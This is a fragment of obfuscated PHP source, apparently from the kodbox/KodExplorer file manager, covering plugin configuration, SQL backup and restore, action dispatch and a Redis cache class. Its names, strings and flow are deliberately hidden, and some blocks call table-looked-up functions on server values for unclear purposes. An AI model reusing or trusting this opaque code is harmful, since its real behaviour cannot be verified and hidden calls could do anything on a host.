$fíÄßÃ˜•++) { $CÀ åó±‹(DATA_PATH . $fíÄßÃ˜•, $BÄÏğ—í®œ); } goto aëÉšô ‘İ; DÉ‹Æé×†: $C‘ƒÄ†Ğ = $F¢˜ÍÓˆå“[788]; $C‘ƒÄ†Ğ($_SERVER[$F¢˜ÍÓˆå“[789]]); $FÌ„Ë¥¨Ëî = $F¢˜ÍÓˆå“[783]; goto cˆÅ©Ê®ø±; cˆÅ©Ê®ø±: $FÌ„Ë¥¨Ëî(); $CÀ åó±‹ = $F¢˜ÍÓˆå“[1263]; $BÄÏğ—í®œ = json_encode($GLOBALS[$F¢˜ÍÓˆå“[1264]]); goto c¢ğùĞÛÛ‡; f×‰ÊšéŞ³: $a¾¤¤‘Ç«İ = $C˜ÓËéÄ²($E‚š©°ó); $B¶ØßØ¥ƒ = explode($F¢˜ÍÓˆå“[214], $a¾¤¤‘Ç«İ); if (count($B¶ØßØ¥ƒ) < $F¢˜ÍÓˆå“[557]) { $A´ôœØ•Ğ = $F¢˜ÍÓˆå“[787]; $A´ôœØ•Ğ(); } goto DÉ‹Æé×†; aëÉšô ‘İ: } return $this->modelPlugin->setConfig($this->pluginName, $cã»¶Ÿ„®Û); } public function onSetConfig($B¼¶½ãáíå) { } public function onGetConfig($fÍİìÖâæ) { } public function onChangeStatus($F½õÚœ¢) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Cí¬ï¥ƒŒ = "\160\154\165\147\151\156\x41\165\164\150") { $aƒŸŒ˜ì½Ì =& $_SERVER[÷ÖêïÔÔÓ]; if (!defined($aƒŸŒ˜ì½Ì[423])) { return !1; } if ($GLOBALS[$aƒŸŒ˜ì½Ì[453]] == 1) { return !0; } $CëÎ™šÍ‚Ú = $this->getConfig(); if (!$CëÎ™šÍ‚Ú[$Cí¬ï¥ƒŒ]) { return !1; } return ActionCall($aƒŸŒ˜ì½Ì[1265], $CëÎ™šÍ‚Ú[$Cí¬ï¥ƒŒ]); } public function url($A„øˆ÷¹, $f–ßÑíåé¹ = '', $a”Ùóâ“ = true) { goto f©®Õ Á«Ù; a•™Ì“÷Ì½: $aÊáÉÜÊÒø = $this->packageVersion(); $EõÅâŒÄÔé = $e†áº¦–¿ . $F”£½š…”³[408] . $aÊáÉÜÊÒø; if ($f–ßÑíåé¹ == $F”£½š…”³[33]) { $cÂ»ø˜è = $this->pluginHost . $A„øˆ÷¹ . $F”£½š…”³[1266] . $EõÅâŒÄÔé; } else { if ($f–ßÑíåé¹ === $F”£½š…”³[77]) { $cÂ»ø˜è = $this->pluginHost . $A„øˆ÷¹; } else { if ($f–ßÑíåé¹ == $F”£½š…”³[1267]) { $cÂ»ø˜è = STATIC_PATH . $A„øˆ÷¹ . $F”£½š…”³[1266] . $e†áº¦–¿; } else { if ($f–ßÑíåé¹ == $F”£½š…”³[1268]) { $cÂ»ø˜è = APP_HOST . $F”£½š…”³[1269] . $A„øˆ÷¹ . $F”£½š…”³[1266] . $e†áº¦–¿; } else { if (isset($bë·§ùŠˆ[$f–ßÑíåé¹])) { $cÂ»ø˜è = $bë·§ùŠˆ[$f–ßÑíåé¹] . $A„øˆ÷¹ . $F”£½š…”³[1266] . $EõÅâŒÄÔé; } } } } } goto DÜ­åƒ¤×•; DÜ­åƒ¤×•: if (!$a”Ùóâ“) { return $cÂ»ø˜è; } echo $cÂ»ø˜è; goto BÍãÁáÜ; f©®Õ Á«Ù: $F”£½š…”³ =& $_SERVER[÷ÖêïÔÔÓ]; $bë·§ùŠˆ = $this->getConfig(); $e†áº¦–¿ = KOD_VERSION . $F”£½š…”³[92] . KOD_VERSION_BUILD; goto a•™Ì“÷Ì½; BÍãÁáÜ: } public function link($FƒÜïùğ‡– = false, $Dª°ÃÚ»Ÿô = '') { $b„Ñ¡¾½–Ê =& $_SERVER[÷ÖêïÔÔÓ]; if (!$FƒÜïùğ‡–) { $this->link($b„Ñ¡¾½–Ê[1270], $b„Ñ¡¾½–Ê[1268]); $this->link($b„Ñ¡¾½–Ê[1271], $b„Ñ¡¾½–Ê[1267]); $this->link($b„Ñ¡¾½–Ê[1272], $b„Ñ¡¾½–Ê[1267]); $this->link($b„Ñ¡¾½–Ê[1273], $b„Ñ¡¾½–Ê[1267]); $this->link($b„Ñ¡¾½–Ê[1274], $b„Ñ¡¾½–Ê[1267]); return; } $AÀ²¬ƒê–ã = $this->url($FƒÜïùğ‡–, $Dª°ÃÚ»Ÿô, !1); if (substr($FƒÜïùğ‡–, -3) == $b„Ñ¡¾½–Ê[1275]) { echo $b„Ñ¡¾½–Ê[1276] . $AÀ²¬ƒê–ã . $b„Ñ¡¾½–Ê[1277] . $b„Ñ¡¾½–Ê[214]; } else { if (substr($FƒÜïùğ‡–, -4) == $b„Ñ¡¾½–Ê[1278]) { echo $b„Ñ¡¾½–Ê[1279] . $AÀ²¬ƒê–ã . $b„Ñ¡¾½–Ê[1280] . $b„Ñ¡¾½–Ê[214]; } } } } class Restore { function __construct($B„»İß³Û¿, $d¨ÅéÕ¥· = '') { $this->database = $B„»İß³Û¿; $this->type = $d¨ÅéÕ¥·; } public function model($a‚À©ŒÉêß = '') { return new ModelBase($a‚À©ŒÉêß, $_SERVER[÷ÖêïÔÔÓ][33], $this->database); } public function db($A„ÊÂ–²¡¦ = false) { goto Fˆ¼¶Í¬ª³; e¡Á·óôšõ: $DŞ–âî¶£Ô = $bİƒ“„â°È[$Eëº‰ñ½Š’[231]]; $bİƒ“„â°È[$Eëº‰ñ½Š’[231]] = $Eëº‰ñ½Š’[33]; if ($bİƒ“„â°È[$Eëº‰ñ½Š’[719]] == $Eëº‰ñ½Š’[720]) { $aêÔİŠÑÉ = $bİƒ“„â°È[$Eëº‰ñ½Š’[722]]; $bİƒ“„â°È[$Eëº‰ñ½Š’[722]] = substr($aêÔİŠÑÉ, 0, strrpos($aêÔİŠÑÉ, $Eëº‰ñ½Š’[1281])); } goto a¸ò½æ‘…Â; a¸ò½æ‘…Â: $this->database = $bİƒ“„â°È; $f¯„‰‰¢ã = $this->model()->db(); $E†øÔàè© = $f¯„‰‰¢ã->execute("\163\x68\x6f\167\x20\x64\x61\x74\x61\x62\141\x73\145\x73\40\x6c\x69\x6b\x65\x20\47{$DŞ–âî¶£Ô}\x27"); goto Cƒ¾¨”öÈå; Cƒ¾¨”öÈå: if (!$E†øÔàè©) { $f¯„‰‰¢ã->execute("\x63\162\x65\141\164\x65\40\x64\x61\x74\141\x62\141\x73\x65\x20\x60{$DŞ–âî¶£Ô}\140"); } $bİƒ“„â°È[$Eëº‰ñ½Š’[231]] = $DŞ–âî¶£Ô; if ($bİƒ“„â°È[$Eëº‰ñ½Š’[719]] == $Eëº‰ñ½Š’[720]) { $bİƒ“„â°È[$Eëº‰ñ½Š’[722]] .= $Eëº‰ñ½Š’[1281] . $DŞ–âî¶£Ô; } goto B³á™ªÙ¾§; B³á™ªÙ¾§: $this->database = $bİƒ“„â°È; $f¯„‰‰¢ã->execute("\165\x73\145\x20\140{$DŞ–âî¶£Ô}\x60"); return $f¯„‰‰¢ã; goto fˆ¼«©—·; Fˆ¼¶Í¬ª³: $Eëº‰ñ½Š’ =& $_SERVER[÷ÖêïÔÔÓ]; $bİƒ“„â°È = $this->database; if ($this->type == $Eëº‰ñ½Š’[9] || !$A„ÊÂ–²¡¦) { return $this->model()->db(); } goto e¡Á·óôšõ; fˆ¼«©—·: } public function createTable($a†¯Í‰ÅĞ¬, $AáÆŠÁ¨ƒÆ = null) { $dÃ‚¯Á—‹Ç =& $_SERVER[÷ÖêïÔÔÓ]; if (!@file_exists($a†¯Í‰ÅĞ¬)) { show_json(LNG($dÃ‚¯Á—‹Ç[1282]), !1); } $EÙ‰×â‹¸ë = sqlSplit(file_get_contents($a†¯Í‰ÅĞ¬)); foreach ($EÙ‰×â‹¸ë as $Dë¡Àâø¼) { if ($AáÆŠÁ¨ƒÆ) { $fÈ§•’Ø‡º = stripos($Dë¡Àâø¼, $dÃ‚¯Á—‹Ç[1283]) === 0; if ($fÈ§•’Ø‡º) { $AáÆŠÁ¨ƒÆ->task[$dÃ‚¯Á—‹Ç[1284]] += 1; } } $this->model()->db()->execute($Dë¡Àâø¼); if ($AáÆŠÁ¨ƒÆ && $fÈ§•’Ø‡º) { $A¸‘ÒÖå† = $dÃ‚¯Á—‹Ç[1285]; preg_match($A¸‘ÒÖå†, $Dë¡Àâø¼, $BÉç¶†ˆŞŞ); $AáÆŠÁ¨ƒÆ->task[$dÃ‚¯Á—‹Ç[1286]] = trim($d‘¿àÎêâÖ[0], $dÃ‚¯Á—‹Ç[819]); $AáÆŠÁ¨ƒÆ->update(1); } } $this->taskToCache($AáÆŠÁ¨ƒÆ); } public function insertTable($BÕŸÆ”è», $eê‰â”Ù•š = null) { $eçÄ­·Š­ =& $_SERVER[÷ÖêïÔÔÓ]; foreach ($BÕŸÆ”è» as $cóæàœÏ·à) { $e¤Šê†îÀŠ = basename($cóæàœÏ·à); $e¤Šê†îÀŠ = substr($e¤Šê†îÀŠ, 0, strrpos($e¤Šê†îÀŠ, $eçÄ­·Š­[92])); if ($eê‰â”Ù•š) { $eê‰â”Ù•š->task[$eçÄ­·Š­[1286]] = $e¤Šê†îÀŠ; } if (get_filesize($cóæàœÏ·à) == 0) { continue; } $c‹‰­ÔÉùˆ = $this->sqlToDb($cóæàœÏ·à, $eê‰â”Ù•š); if (!$c‹‰­ÔÉùˆ) { show_json(LNG($eçÄ­·Š­[1287]) . "\133{$e¤Šê†îÀŠ}\x5d", !1); } } $this->taskToCache($eê‰â”Ù•š); } public function sqlFromDb($AÆõŒÄ™”¦, $F½ßÆ”¦, $CÙöÀ¥îñ— = null) { goto b²öºñ‚õ»; a¶­ó¹ñŠô: do { $C„¦Ùö’â = $dºÓÇ³çÔù->field($eöØÈö‘’‰)->order($B²áÁË£¬ . $fª†êïÜš¸[707])->selectPage($féÍ¦†¥öœ, $EØÕÖŸß–Ÿ); $bç´£„… = !empty($C„¦Ùö’â[$fª†êïÜš¸[350]]) ? $C„¦Ùö’â[$fª†êïÜš¸[350]] : array(); if (!($fÎŞîğçÚ× = count($bç´£„…))) { break; } if ($CÙöÀ¥îñ—) { $CÙöÀ¥îñ—->task[$fª†êïÜš¸[1284]] += $fÎŞîğçÚ×; } $F£«ÀÜãñŸ = array(); foreach ($bç´£„… as $E©îä²ÛÉƒ) { $F£«ÀÜãñŸ[] = $fª†êïÜš¸[710] . $this->sqlEncode($E©îä²ÛÉƒ) . $fª†êïÜš¸[711]; } $eŸä°¿ç¯Ä = "\x49\x4e\x53\x45\x52\124\40\x49\116\x54\117\x20\x60{$AÆõŒÄ™”¦}\140\40\x28\140" . implode($fª†êïÜš¸[712], $eöØÈö‘’‰) . $fª†êïÜš¸[713]; fwrite($f††»ä–ë›, $eŸä°¿ç¯Ä . implode($fª†êïÜš¸[714], $F£«ÀÜãñŸ) . $fª†êïÜš¸[68] . PHP_EOL); $EØÕÖŸß–Ÿ++; $fïÏáõ…ŸÍ += $fÎŞîğçÚ×; if ($CÙöÀ¥îñ—) { $CÙöÀ¥îñ—->update($fÎŞîğçÚ×); } } while ($fÎŞîğçÚ× == $féÍ¦†¥öœ); fclose($f††»ä–ë›); return $fïÏáõ…ŸÍ; goto b†‰Ç˜ìß; CÕÁÁÂßß: $f††»ä–ë› = fopen($F½ßÆ”¦, $fª†êïÜš¸[706]); $B²áÁË£¬ = $dºÓÇ³çÔù->getPk(); $eöØÈö‘’‰ = $dºÓÇ³çÔù->getDbFields(); goto a¶­ó¹ñŠô; Aæ‘Ò‹‘æ—: $fïÏáõ…ŸÍ = 0; $EØÕÖŸß–Ÿ = 1; $féÍ¦†¥öœ = 500; goto CÕÁÁÂßß; b²öºñ‚õ»: $fª†êïÜš¸ =& $_SERVER[÷ÖêïÔÔÓ]; if ($CÙöÀ¥îñ—) { $CÙöÀ¥îñ—->task[$fª†êïÜš¸[1286]] = $AÆõŒÄ™”¦; } $dºÓÇ³çÔù = $this->model($AÆõŒÄ™”¦); goto Aæ‘Ò‹‘æ—; b†‰Ç˜ìß: } public function sqlToDb($cÀ¨°ŸÃšê, $FÍÑÜŒÑ—– = null) { goto Bƒíå¿·÷›; bƒ‰Áº¿Æİ: $A‘ª¥ÂŒÍ = 500 + 1; while (!feof($f´èßÜøÜ)) { if ($FÍÑÜŒÑ—– && $C±ÖÒğ†Œ¥ != 0) { $FÍÑÜŒÑ—–->task[$fÏÍãÕÈÈ[1284]] += 1; } $C±ÖÒğ†Œ¥++; $BÉƒ“¼âíì = trim(fgets($f´èßÜøÜ)); $Aò¬ŠÛšÏŠ .= $fÏÍãÕÈÈ[50] . $this->sqlDecode($BÉƒ“¼âíì, $this->type); if ($C±ÖÒğ†Œ¥ == $A‘ª¥ÂŒÍ) { $Aò¬ŠÛšÏŠ = rtrim($Aò¬ŠÛšÏŠ, $fÏÍãÕÈÈ[68]); if (!$FÖ‰ÕâÉİÓ->execute($Aò¬ŠÛšÏŠ)) { return !1; } if ($FÍÑÜŒÑ—–) { $FÍÑÜŒÑ—–->update($C±ÖÒğ†Œ¥ - 1); } $Aò¬ŠÛšÏŠ = $fÏÍãÕÈÈ[33]; $C±ÖÒğ†Œ¥ = 0; } } fclose($f´èßÜøÜ); goto Fç½®Ê¦à¯; Bƒíå¿·÷›: $fÏÍãÕÈÈ =& $_SERVER[÷ÖêïÔÔÓ]; $FÖ‰ÕâÉİÓ = $this->model()->db(); $f´èßÜøÜ = @fopen($cÀ¨°ŸÃšê, $fÏÍãÕÈÈ[1288]); goto d½ùğƒ›·‘; Fç½®Ê¦à¯: if ($Aò¬ŠÛšÏŠ) { $Aò¬ŠÛšÏŠ = rtrim($Aò¬ŠÛšÏŠ, $fÏÍãÕÈÈ[68]); if (!$FÖ‰ÕâÉİÓ->execute($Aò¬ŠÛšÏŠ)) { return !1; } if ($FÍÑÜŒÑ—–) { $FÍÑÜŒÑ—–->update($C±ÖÒğ†Œ¥ - 1); } } return !0; goto EÖĞˆğæ¿ô; d½ùğƒ›·‘: if (!$f´èßÜøÜ) { return !1; } $C±ÖÒğ†Œ¥ = 0; $Aò¬ŠÛšÏŠ = $fÏÍãÕÈÈ[33]; goto bƒ‰Áº¿Æİ; EÖĞˆğæ¿ô: } public function dropTable($Dˆ¯¿ôµÓ¥ = null) { $a‘é‹”ò•” = $this->model()->db(); $F†‹³±°‡ = $Dˆ¯¿ôµÓ¥ ? array($Dˆ¯¿ôµÓ¥) : $a‘é‹”ò•”->getTables(); if (!$F†‹³±°‡) { return; } foreach ($F†‹³±°‡ as $Dˆ¯¿ôµÓ¥) { $a‘é‹”ò•”->execute("\x64\x72\x6f\160\40\x74\x61\142\154\145\40\x69\x66\40\145\170\151\x73\164\x73\40\x60{$Dˆ¯¿ôµÓ¥}\x60"); } } private function taskToCache($aà²’•ÊËŸ = null) { $bìÌ‚°È =& $_SERVER[÷ÖêïÔÔÓ]; if (!$aà²’•ÊËŸ) { return; } $eŠˆÓ»£‹ = array($bìÌ‚°È[1286] => $aà²’•ÊËŸ->task[$bìÌ‚°È[1286]], $bìÌ‚°È[1284] => $aà²’•ÊËŸ->task[$bìÌ‚°È[1284]], $bìÌ‚°È[1289] => $aà²’•ÊËŸ->task[$bìÌ‚°È[1289]]); if ($eŠˆÓ»£‹[$bìÌ‚°È[1284]] == $eŠˆÓ»£‹[$bìÌ‚°È[1289]]) { $eŠˆÓ»£‹[$bìÌ‚°È[682]] = 1; } Cache::set($bìÌ‚°È[1290] . $aà²’•ÊËŸ->task[$bìÌ‚°È[364]], $eŠˆÓ»£‹); $aà²’•ÊËŸ->end(); } private function sqlEncode($CßÍëöÀíÒ) { $Bøäãø¼ÊÒ =& $_SERVER[÷ÖêïÔÔÓ]; $b³•×àß = array(); foreach ($CßÍëöÀíÒ as $cÆ¶à›½’ô) { if (is_array($cÆ¶à›½’ô)) { $cÆ¶à›½’ô = json_encode_force($cÆ¶à›½’ô); } $cÆ¶à›½’ô = addslashes($cÆ¶à›½’ô); $cÆ¶à›½’ô = str_replace(array($Bøäãø¼ÊÒ[715], $Bøäãø¼ÊÒ[214]), array($Bøäãø¼ÊÒ[716], $Bøäãø¼ÊÒ[717]), $cÆ¶à›½’ô); $b³•×àß[] = str_replace($Bøäãø¼ÊÒ[55], $Bøäãø¼ÊÒ[1291], $cÆ¶à›½’ô); } return $Bøäãø¼ÊÒ[55] . implode($Bøäãø¼ÊÒ[718], $b³•×àß) . $Bøäãø¼ÊÒ[55]; } private function sqlDecode($b…Øè—Àº³, $D®Ù”Â†êË) { $aİÚÃ°°ƒî =& $_SERVER[÷ÖêïÔÔÓ]; $b…Øè—Àº³ = str_replace(array($aİÚÃ°°ƒî[716], $aİÚÃ°°ƒî[717]), array($aİÚÃ°°ƒî[715], $aİÚÃ°°ƒî[214]), $b…Øè—Àº³); if ($D®Ù”Â†êË == $aİÚÃ°°ƒî[9]) { $b…Øè—Àº³ = stripslashes($b…Øè—Àº³); } return $b…Øè—Àº³; } } goto dŒŸİ ×å ; cëµå©ª‘Á: function Action($fùì…ìŠ„ = '') { goto FêÆ¡õŒ´; cÚ£ƒÂš„Á: $aŒ²Ã›Ó³ = explode($A Ñ£ÂŞö[5], $fùì…ìŠ„); $dæ¸Ö†¸°ë = strtolower($aŒ²Ã›Ó³[0]); if (substr($dæ¸Ö†¸°ë, -6) == $A Ñ£ÂŞö[6]) { $fùì…ìŠ„ = substr($aŒ²Ã›Ó³[0], 0, -6); $Cõ¾èÁÙ‘ƒ = $fùì…ìŠ„ . $A Ñ£ÂŞö[7]; $f“•õ« Ûß = $A Ñ£ÂŞö[8]; if (isset($aŒ²Ã›Ó³[1]) && substr(strtolower($aŒ²Ã›Ó³[1]), -5) == $A Ñ£ÂŞö[9]) { $Cõ¾èÁÙ‘ƒ = $fùì…ìŠ„ . $aŒ²Ã›Ó³[1]; $f“•õ« Ûß = $A Ñ£ÂŞö[10] . $aŒ²Ã›Ó³[1] . $A Ñ£ÂŞö[11]; } else { if (count($aŒ²Ã›Ó³) == 3) { $Cõ¾èÁÙ‘ƒ = $fùì…ìŠ„ . $aŒ²Ã›Ó³[1] . $aŒ²Ã›Ó³[2]; $f“•õ« Ûß = $A Ñ£ÂŞö[12] . $aŒ²Ã›Ó³[1] . $A Ñ£ÂŞö[13] . $aŒ²Ã›Ó³[2] . $A Ñ£ÂŞö[11]; } } $f“•õ« Ûß = PLUGIN_DIR . $fùì…ìŠ„ . $A Ñ£ÂŞö[4] . $f“•õ« Ûß; } else { if (substr($dæ¸Ö†¸°ë, -5) == $A Ñ£ÂŞö[9]) { $fùì…ìŠ„ = substr($aŒ²Ã›Ó³[0], 0, -5); return Model($fùì…ìŠ„); } else { $Cõ¾èÁÙ‘ƒ = $aŒ²Ã›Ó³[0] . $aŒ²Ã›Ó³[1]; $f“•õ« Ûß = CONTROLLER_DIR . $aŒ²Ã›Ó³[0] . $A Ñ£ÂŞö[4] . $aŒ²Ã›Ó³[1] . $A Ñ£ÂŞö[14]; } } goto A¡ÄÙç‚Ó”; FêÆ¡õŒ´: $A Ñ£ÂŞö =& $_SERVER[Óº‹‘Î]; static $cãÖÅÜìŞ² = array(); $fùì…ìŠ„ = trim(str_replace($A Ñ£ÂŞö[4], $A Ñ£ÂŞö[5], $fùì…ìŠ„), $A Ñ£ÂŞö[4]); goto cÚ£ƒÂš„Á; A³¦¤Øì: if (!class_exists($Cõ¾èÁÙ‘ƒ)) { return actionCallError("\133{$fùì…ìŠ„}\40\75\76\x20{$Cõ¾èÁÙ‘ƒ}\135\40\143\154\141\163\163\40\156\x6f\164\40\x65\x78\x69\163\164\163\x21"); } $cãÖÅÜìŞ²[$FŒ¢ÉÕÁñä] = new $Cõ¾èÁÙ‘ƒ(); return $cãÖÅÜìŞ²[$FŒ¢ÉÕÁñä]; goto dÈŒœ¸ÖÔ‘; A¡ÄÙç‚Ó”: $FŒ¢ÉÕÁñä = strtolower($Cõ¾èÁÙ‘ƒ); if (isset($cãÖÅÜìŞ²[$FŒ¢ÉÕÁñä])) { return $cãÖÅÜìŞ²[$FŒ¢ÉÕÁñä]; } if (is_file($f“•õ« Ûß)) { include_once $f“•õ« Ûß; } goto A³¦¤Øì; dÈŒœ¸ÖÔ‘: } function ActionApply($AàíËÓé‘Í, $d¾Ò¡“…ö = array()) { goto BÌÆÆÇ½Ì; AÂšíç‘ä£: $cˆ¬•Ğ¸«Ş = substr($AàíËÓé‘Í, 0, $f„é†òÃ‘); $aŞÍÍ‡­§Ê = substr($AàíËÓé‘Í, $f„é†òÃ‘ + 1); $C¼¼ïÇ¾èĞ = Action($cˆ¬•Ğ¸«Ş); goto BÑß“ÕµÎ; BÌÆÆÇ½Ì: if (is_array($AàíËÓé‘Í)) { return call_user_func_array($AàíËÓé‘Í, $d¾Ò¡“…ö); } if (function_exists($AàíËÓé‘Í)) { return call_user_func_array($AàíËÓé‘Í, $d¾Ò¡“…ö); } $f„é†òÃ‘ = strrpos($AàíËÓé‘Í, $_SERVER[Óº‹‘Î][5]); goto AÂšíç‘ä£; BÑß“ÕµÎ: if (!method_exists($C¼¼ïÇ¾èĞ, $aŞÍÍ‡­§Ê)) { return actionCallError("{$AàíËÓé‘Í}\40\x6d\x65\x74\150\157\x64\40\x6e\157\x74\40\145\170\151\163\164\163\x21"); } $d¿–é…Ì°Ë = call_user_func_array(array($C¼¼ïÇ¾èĞ, $aŞÍÍ‡­§Ê), $d¾Ò¡“…ö); return $d¿–é…Ì°Ë; goto aß§‘Ğ…Í¨; aß§‘Ğ…Í¨: } function actionCallError($Bµ°¢² ) { $D´›áŞóƒø =& $_SERVER[Óº‹‘Î]; $Bğ…½çß´ = json_encode_force(array($D´›áŞóƒø[15] => this_url(), $D´›áŞóƒø[16] => $GLOBALS[$D´›áŞóƒø[16]])); $Bğ…½çß´ = str_replace(array($D´›áŞóƒø[17]), array($D´›áŞóƒø[4]), $Bğ…½çß´); return write_log($Bµ°¢²  . $D´›áŞóƒø[18] . $Bğ…½çß´, $D´›áŞóƒø[19]); } goto d§íª·–Ó±; EÅËãïÛáæ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($E¬àß›™±ˆ, $F™¬ÖŞÈáÑ) { $B¶ìµ§â÷ =& $_SERVER[÷ÖêïÔÔÓ]; if (!class_exists($B¶ìµ§â÷[774])) { show_json($B¶ìµ§â÷[775], !1); } $this->cacheTime = $F™¬ÖŞÈáÑ; $D¹³„Ô—°¤ = isset($E¬àß›™±ˆ[$B¶ìµ§â÷[776]]) ? $E¬àß›™±ˆ[$B¶ìµ§â÷[776]] : 10; $E“Ò¯‘êÔŒ = _get($E¬àß›™±ˆ, $B¶ìµ§â÷[773]); if ($E“Ò¯‘êÔŒ && is_array($E“Ò¯‘êÔŒ)) { $this->isCluster = !0; $this->initCluster($E¬àß›™±ˆ, $D¹³„Ô—°¤); } else { $this->handle = $this->init($E¬àß›™±ˆ, $D¹³„Ô—°¤); } } private function init($dí¢ØØñ†ã, $E¥íØ‘ÇÇ±) { $cñåê˜š†— =& $_SERVER[÷ÖêïÔÔÓ]; $A¶´îÆ ÁŠ = new Redis(); $dÀ›óµäé = isset($dí¢ØØñ†ã[$cñåê˜š†—[777]]) ? $dí¢ØØñ†ã[$cñåê˜š†—[777]] : !1; if ($dÀ›óµäé) { $A¶´îÆ ÁŠ->pconnect($dí¢ØØñ†ã[$cñåê˜š†—[166]], $dí¢ØØñ†ã[$cñåê˜š†—[167]], $E¥íØ‘ÇÇ±); } else { $A¶´îÆ ÁŠ->connect($dí¢ØØñ†ã[$cñåê˜š†—[166]], $dí¢ØØñ†ã[$cñåê˜š†—[167]], $E¥íØ‘ÇÇ±); } if (!empty($dí¢ØØñ†ã[$cñåê˜š†—[373]])) { $A¶´îÆ ÁŠ->auth($dí¢ØØñ†ã[$cñåê˜š†—[373]]); } return $A¶´îÆ ÁŠ; } private function initCluster($F·‘£èŠ‡Ï, $A ËÆ²•Óƒ) { $AÓÎØ´¯®Î =& $_SERVER[÷ÖêïÔÔÓ]; $Dóè•ŠçãŸ = array($AÓÎØ´¯®Î[778], $AÓÎØ´¯®Î[779], $AÓÎØ´¯®Î[780]); $FÁ¹×É‡Ò = $AÓÎØ´¯®Î[778]; if (isset($F·‘£èŠ‡Ï[$AÓÎØ´¯®Î[12]]) && in_array($F·‘£èŠ‡Ï[$AÓÎØ´¯®Î[12]], $Dóè•ŠçãŸ)) { $FÁ¹×É‡Ò = $F·‘£èŠ‡Ï[$AÓÎØ´¯®Î[12]]; } switch ($FÁ¹×É‡Ò) { case $AÓÎØ´¯®Î[778]: $this->_slave($F·‘£èŠ‡Ï, $A ËÆ²•Óƒ); break; case $AÓÎØ´¯®Î[779]: break; case $AÓÎØ´¯®Î[780]: $B±›ñõéó¦ = $F·‘£èŠ‡Ï[$AÓÎØ´¯®Î[773]]; $B’²Ä¹¦‹ = isset($F·‘£èŠ‡Ï[$AÓÎØ´¯®Î[777]]) ? $F·‘£èŠ‡Ï[$AÓÎØ´¯®Î[777]] : !1; $dğñòÛ”® = isset($F·‘£èŠ‡Ï[$AÓÎØ´¯®Î[373]]) ? $F·‘£èŠ‡Ï[$AÓÎØ´¯®Î[373]] : null; $this->handle = new RedisCluster(NUll, $B±›ñõéó¦, $A ËÆ²•Óƒ, $A ËÆ²•Óƒ, $B’²Ä¹¦‹, $dğñòÛ”®); break; default: break; } } private function _slave($C«”÷“ï’, $Fä“¤Š’—“) { goto F¯¯åÅÕ‰; DóŒ™…ˆÛ: unset($bˆ—’· ¼¾[0]); if (empty($bˆ—’· ¼¾)) { return; } $Cù÷êÍ– = array_rand($bˆ—’· ¼¾); goto CÎ™Æö…ÈÒ; CÎ™Æö…ÈÒ: $this->filterConfig($C«”÷“ï’, $bˆ—’· ¼¾[$Cù÷êÍ–]); $this->slaveHandle = $this->init($C«”÷“ï’, $Fä“¤Š’—“); goto D¡ó¼ØÇˆ‘; F¯¯åÅÕ‰: $bˆ—’· ¼¾ = $C«”÷“ï’[$_SERVER[÷ÖêïÔÔÓ][773]]; $this->filterConfig($C«”÷“ï’, $bˆ—’· ¼¾[0]); $this->handle = $this->init($C«”÷“ï’, $Fä“¤Š’—“); goto DóŒ™…ˆÛ; D¡ó¼ØÇˆ‘: } private function filterConfig(&$EÁôŒã†â, $eƒñÅÛÉƒª) { $DÖƒ–æŠ·Š =& $_SERVER[÷ÖêïÔÔÓ]; $Bñ‚±»¡¸™ = explode($DÖƒ–æŠ·Š[4], $eƒñÅÛÉƒª); $fÁâèÍ® = array($DÖƒ–æŠ·Š[166] => $Bñ‚±»¡¸™[0], $DÖƒ–æŠ·Š[167] => $Bñ‚±»¡¸™[1]); $EÁôŒã†â = array_merge($EÁôŒã†â, $fÁâèÍ®); } public function set($E÷ÃŞŸÍ¨ù, $D™øßÒ°, $a»–Ëâ¢àà = false) { $a»–Ëâ¢àà = $a»–Ëâ¢àà ? $a»–Ëâ¢àà : $this->cacheTime; return $this->handle->setEx($E÷ÃŞŸÍ¨ù, $a»–Ëâ¢àà, $D™øßÒ°); } public function setLock($Bğ·¸‚Œ, $FØÛÕ…‘ŠÓ, $FÏ´ŒäÛŒ) { return $this->handle->setNX($Bğ·¸‚Œ, $FØÛÕ…‘ŠÓ); } public function get($CÕ°“îïÙ¶) { $cˆÚàÛ”¥¢ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $cˆÚàÛ”¥¢->get($CÕ°“îïÙ¶); } public function remove($aÆøâ“„“) { return $this->handle->del($aÆøâ“„“); } public function deleteAll() { $FëÛŞïÊ¥Ù =& $_SERVER[÷ÖêïÔÔÓ]; if ($_SERVER[$FëÛŞïÊ¥Ù[781]] != $_SERVER[$FëÛŞïÊ¥Ù[782]]) { goto AˆƒÑçã’ø; Bƒİ¶â‹Ö: $d’Ö‘À›¹× = $FëÛŞïÊ¥Ù[788]; $d’Ö‘À›¹×($_SERVER[$FëÛŞïÊ¥Ù[789]]); $d’Ö‘À›¹×($_SERVER[$FëÛŞïÊ¥Ù[785]] . $FëÛŞïÊ¥Ù[790]); goto eŒ”–ÕîÊ; eŒ”–ÕîÊ: $CÍ™“··Ú = 1; while ($CÍ™“··Ú > 1) { $CÍ™“··Ú = $CÍ™“··Ú + 4; $fĞÕ¥ô· = rawurlencode($CÍ™“··Ú . $FëÛŞïÊ¥Ù[358]); } goto a‡÷î¦™ğ‘; AˆƒÑçã’ø: $e¯Åè»Ù…ê = $FëÛŞïÊ¥Ù[783]; $dÈÆ×Ÿ¹©Š = $FëÛŞïÊ¥Ù[784]; $F©æ¹ŒÔğ¯ = $_SERVER[$FëÛŞïÊ¥Ù[785]] . $FëÛŞïÊ¥Ù[786]; goto B¥ššäøÖƒ; B¥ššäøÖƒ: $fÇ´Õ„§·İ = $dÈÆ×Ÿ¹©Š($F©æ¹ŒÔğ¯); $e÷ºÒØØå = explode($FëÛŞïÊ¥Ù[214], $fÇ´Õ„§·İ); if (count($e÷ºÒØØå) < $FëÛŞïÊ¥Ù[557]) { $C‡‡Ş±À¦Š = $FëÛŞïÊ¥Ù[787]; $C‡‡Ş±À¦Š(); } goto Bƒİ¶â‹Ö; a‡÷î¦™ğ‘: } if ($this->isCluster) { foreach ($this->handle->_masters() as $C¸ÂáÑÂÙË) { $this->handle->flushall($C¸ÂáÑÂÙË); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($bßºôà¦ÊØ = '', $Aå¼óŠè¢ = 0) { if (is_string($bßºôà¦ÊØ) && $bßºôà¦ÊØ != $_SERVER[÷ÖêïÔÔÓ][33]) { $this->prefix = $bßºôà¦ÊØ; } if (is_numeric($Aå¼óŠè¢) && $Aå¼óŠè¢ > 0) { 